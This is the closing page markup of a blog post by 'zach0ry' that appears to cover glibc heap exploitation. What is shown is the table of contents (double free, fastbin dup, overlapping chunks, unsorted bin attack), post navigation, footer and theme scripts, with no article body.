        <li class="weibo share-item border-box flex-center tooltip"
            data-tooltip-content="Share to WeiBo"
        >
            <i class="fa-brands fa-weibo"></i>
        </li>
    </ul>
</div>

                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/10/23/Unlink/"
                                   title="Unlink"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Unlink</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/09/28/UAF%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"
                                   title="UAF漏洞初探"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">UAF漏洞初探</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#double-free"><span class="nav-number">1.</span> <span class="nav-text">double_free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-number">1.1.</span> <span class="nav-text">fastbin_dup_into_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">1.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#overlapping-chunks"><span class="nav-number">2.</span> <span class="nav-text">overlapping_chunks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#size-change"><span class="nav-number">2.1.</span> <span class="nav-text">size_change</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pre-size-change"><span class="nav-number">2.2.</span> <span class="nav-text">pre_size change</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsorted-bin"><span class="nav-number">3.</span> <span class="nav-text">unsorted_bin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin%E8%B0%83%E9%85%8D"><span class="nav-number">3.1.</span> <span class="nav-text">unsorted_bin调配</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin%E6%94%BB%E5%87%BB"><span class="nav-number">3.2.</span> <span class="nav-text">unsorted_bin攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">3.2.0.1.</span> <span class="nav-text">实操</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#double-free"><span class="nav-number">1.</span> <span class="nav-text">double_free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-number">1.1.</span> <span class="nav-text">fastbin_dup_into_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">1.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#overlapping-chunks"><span class="nav-number">2.</span> <span class="nav-text">overlapping_chunks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#size-change"><span class="nav-number">2.1.</span> <span class="nav-text">size_change</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pre-size-change"><span class="nav-number">2.2.</span> <span class="nav-text">pre_size change</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsorted-bin"><span class="nav-number">3.</span> <span class="nav-text">unsorted_bin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin%E8%B0%83%E9%85%8D"><span class="nav-number">3.1.</span> <span class="nav-text">unsorted_bin调配</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin%E6%94%BB%E5%87%BB"><span class="nav-number">3.2.</span> <span class="nav-text">unsorted_bin攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">3.2.0.1.</span> <span class="nav-text">实操</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
            
<script src="/js/post/share.js"></script>

        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
